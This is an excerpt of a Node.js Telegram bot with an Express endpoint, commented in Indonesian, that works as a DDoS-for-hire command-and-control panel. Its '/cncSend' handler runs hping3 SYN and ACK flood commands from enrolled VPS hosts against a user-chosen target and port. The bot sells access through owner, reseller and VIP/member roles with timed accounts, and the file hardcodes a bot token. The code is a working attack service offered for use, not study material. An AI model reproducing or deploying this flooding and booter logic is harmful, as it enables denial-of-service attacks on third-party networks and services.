...
const listDDoS = [
  { ddos_id: "udp", ddos_name: "UDP" },
  { ddos_id: "icmp", ddos_name: "ICMP" },
  { ddos_id: "syn-pps", ddos_name: "TCP SYN-PPS" },
  { ddos_id: "ack-pps", ddos_name: "TCP ACK-PPS" },
  { ddos_id: "syn-gbps", ddos_name: "TCP SYN-GBPS" },
  { ddos_id: "ack-gbps", ddos_name: "TCP ACK-GBPS" },
]
...
const pendingCreate = {};
const TOKEN = "8977358555:AAHEBhv47hD8S7g4Ire7IehRsJfmxwfPsrw"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

const OWNER_ID = [7988781621];
...
app.get("/cncSend", async (req, res) => {
  ...
  for (const vps of userVPS) {
    ...
    } else if (ddos === "syn-pps") {
      command = `hping3 -S --flood ${target} -p ${port}`;
    } else if (ddos === "ack-pps") {
      command = `hping3 -A --flood ${target} -p ${port}`;
    } else if (ddos === "syn-gbps") {
      command = `hping3 -S --flood ${target} -p ${port} --data 65495`;
    } else if (ddos === "ack-gbps") {
      command = `hping3 -A --flood ${target} -p ${port} --data 65495`;
    }

    await executeOnVPS(vps, command)
    await executeOnVPS(vps, killCmd)
    console.log(`${vps.host} Done`)
  }
...
function saveTelegramConfig(config) {
  config.ownerList = config.ownerList.map(id => Number(id));
  config.userList = config.userList.map(id => Number(id));
  config.resellerList = config.resellerList.map(id => Number(id));
...
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) {
    fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [], resellerList: [] }, null, 2));
  }
  const data = JSON.parse(fs.readFileSync(telegramDataPath));
  
  // Pastikan semuanya number
  data.ownerList = (data.ownerList || []).map(id => Number(id));
  data.userList = (data.userList || []).map(id => Number(id));
  data.resellerList = (data.resellerList || []).map(id => Number(id));
...
bot.onText(/\/(start|menu)/, async (msg) => {
  try {
    ...
    const photoUrl = 'https://files.catbox.moe/zukshv.jpg';

    await bot.sendPhoto(
      id,
      photoUrl,
      {
        caption: `<b>Hello bro ${msg.from.first_name}!</b>

Aku <b>Zero Ark</b>, asisten bot milik <b>@Justcallmenoah0</b>.
Silakan pilih menu di bawah untuk memulai.

<b>Panduan Singkat:</b>
- Untuk menambah Akun Baru, Ketik /ckey user,pw
- Untuk melihat daftar sender aktif, ketik list_sender.
- Untuk add sender apk, ketik /connect nomor lu.

<b>Pilih menu di bawah untuk lanjut.</b>`,
        parse_mode: "HTML",
        ...options
      }
    );
  } catch (e) {
    console.error("Error saat menjalankan /start:", e);
  }
});
...
bot.on("callback_query", async (query) => {
  ...
  const chatId = query.message.chat.id; // <── penting supaya bisa di grup
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isReseller = config.resellerList?.includes(id) || false;
  const isUser = config.userList.includes(id) || isReseller || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  // FILTER agar bot.once hanya menerima pesan dari pengguna callback
  const waitUserMessage = (handler) => {
    bot.once("message", (msg) => {
      if (msg.from.id !== id) return; // <── cegah user lain di grup ikut ter-triger
      handler(msg);
    });
  };
  ...
  if (!isOwner && !isReseller) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya izin untuk membuat member.");
  }

  // ⬇️ Tambahan PERINGATAN /ckey
  bot.sendMessage(chatId, "⚠️ Untuk membuat akun, pastikan kamu sudah punya CKEY!\nGunakan perintah: /ckey\n");

  bot.sendMessage(chatId, "Ketikan Fitur: /ckey username,durasi,pw", { parse_mode: "Markdown" });
      break;

    case "set_expire":
      if (!isOwner) return bot.sendMessage(chatId, "❌ Hanya owner yang bisa memperpanjang masa aktif.");
    ...
    case "list_user":
      ...
      bot.sendMessage(chatId, `📋 *Daftar Pengguna:* maklu gw ewe mau😹`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
  if (!isOwner) return bot.sendMessage(chatId, "❌ Hanya owner yang bisa membuat custom role.");

  // ⬇️ Tambahan PERINGATAN /ckey
  bot.sendMessage(chatId, "⚠️ Untuk membuat akun custom, gunakan CKEY terlebih dahulu!\nCommand: /ckey\n");

  bot.sendMessage(chatId, "Ketikan fitur: /ckey username,durasi,pw,role ` (role = owner/reseller/member)", { parse_mode: "Markdown" });
      break;

    case "delete_user":
      if (!isOwner) return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menghapus user.");
...
bot.onText(/\/add_akses (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const config = loadTelegramConfig();
  if (!config.ownerList.includes(userId)) return bot.sendMessage(chatId, "Hanya owner yang bisa menambah reseller.");

  const resellerId = match[1].trim();
  if (config.resellerList?.includes(resellerId)) {
    return bot.sendMessage(chatId, " ID tersebut sudah terdaftar sebagai reseller.");
  }

  config.resellerList = config.resellerList || [];
  config.resellerList.push(resellerId);
  saveTelegramConfig(config);
  bot.sendMessage(chatId, `Akses ini hanya untuk reseller, ${resellerId} berhasil ditambahkan.`);
});

bot.onText(/\/add_vip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const config = loadTelegramConfig();
  if (!config.ownerList.includes(userId)) return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menambah owner lain.");

  const newOwnerId = match[1].trim();
  if (config.ownerList.includes(newOwnerId)) {
    return bot.sendMessage(chatId, "⚠️ ID tersebut sudah terdaftar sebagai owner.");
  }

  config.ownerList.push(newOwnerId);
  saveTelegramConfig(config);
  bot.sendMessage(chatId, `✅  Akses ini hanya untuk own, ${newOwnerId} berhasil ditambahkan.`);
});
...
bot.onText(/\/ckey (.+)/, async (msg, match) => {
  ...
  const isOwner = (config.ownerList || []).map(String).includes(callerId);
  const isReseller = (config.resellerList || []).map(String).includes(callerId);

  if (!isOwner && !isReseller) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya izin untuk menggunakan /ckey.");
  }
  ...
  if (parts.length !== 2) {
    return bot.sendMessage(chatId, "⚠️ Format: /ckey username,pw");
  }
  ...
  // simpan data sementara pakai pendingCreate
  pendingCreate[callerId] = { username, password, fromChat: chatId };

  const buttons = [
    [{ text: "🟦 7 Hari", callback_data: "exp_7d" }],
    [{ text: "🟩 1 Bulan", callback_data: "exp_30d" }],
    [{ text: "🟨 1 Tahun", callback_data: "exp_365d" }],
  ];

  bot.sendMessage(chatId, "⏳ Pilih durasi akun:", {
...
bot.on("callback_query", async (query) => {
  ...
  // Ini penting agar bisa di grup / pv tanpa error
  const chatId = query.message.chat.id;
  ...
  if (!isOwner && !isReseller) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Kamu tidak punya akses reseller/owner."
    });
  }

  if (!pendingCreate[callerId]) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Tidak ada proses pembuatan akun."
    });
  }
  ...
  if (data.startsWith("exp_")) {
    ...
    if (data === "exp_7d") durasi = 7;
    if (data === "exp_30d") durasi = 30;
    if (data === "exp_365d") durasi = 365;

    pendingCreate[callerId].durasi = durasi;
    ...
    if (isOwner) {
      buttons = [
        ...
        [{ text: "VIP", callback_data: "role_vip" }],
        [{ text: "Member", callback_data: "role_member" }],
      ];
    }

    // Reseller hanya bisa VIP & Member
    else if (isReseller) {
      buttons = [
        [{ text: "VIP", callback_data: "role_vip" }],
        [{ text: "Member", callback_data: "role_member" }],
    ...
    bot.editMessageText("🏷 Sekarang pilih role akun:", {
      chat_id: chatId,
  ...
  // ============================
  // PILIH ROLE → FINAL CREATE
  // ============================
  if (data.startsWith("role_")) {

    const role = data.replace("role_", "");
    const { username, password, durasi } = pendingCreate[callerId];

    const db = loadDatabase();

    const expired = new Date();
    expired.setDate(expired.getDate() + durasi);
